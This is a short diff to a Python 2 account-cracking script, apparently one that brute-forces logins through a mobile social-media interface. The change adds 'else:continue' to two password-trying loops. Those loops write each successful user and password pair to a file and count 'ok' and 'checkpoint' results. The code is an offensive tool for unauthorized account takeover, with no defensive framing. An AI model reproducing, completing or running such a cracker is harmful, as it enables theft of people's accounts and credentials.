@@ -413,7 +413,7 @@ def crack1_mbasic(user):
 				save.write(str(user)+' • '+str(pw)+'\n')
 				save.close()
 				break
-				
+			else:continue
 		loop += 1
                 print "\r\x1b[0;37m   [Crack] %s/%s - ok-:%s - cp-:%s "%(loop,len(target),len(Successful),len(Checkpoint)),;sys.stdout.flush()
         except:
@@ -461,7 +461,7 @@ def cs(user):
 				save.write(str(user)+' • '+str(i)+'\n')
 				save.close()
 				break
-				
+			else:continue
 		loop += 1
                 print "\r\x1b[0;37m   [Crack] %s/%s - ok-:%s - cp-:%s \033[0m"%(loop,len(target),len(Successful),len(Checkpoint)),;sys.stdout.flush()
         except:
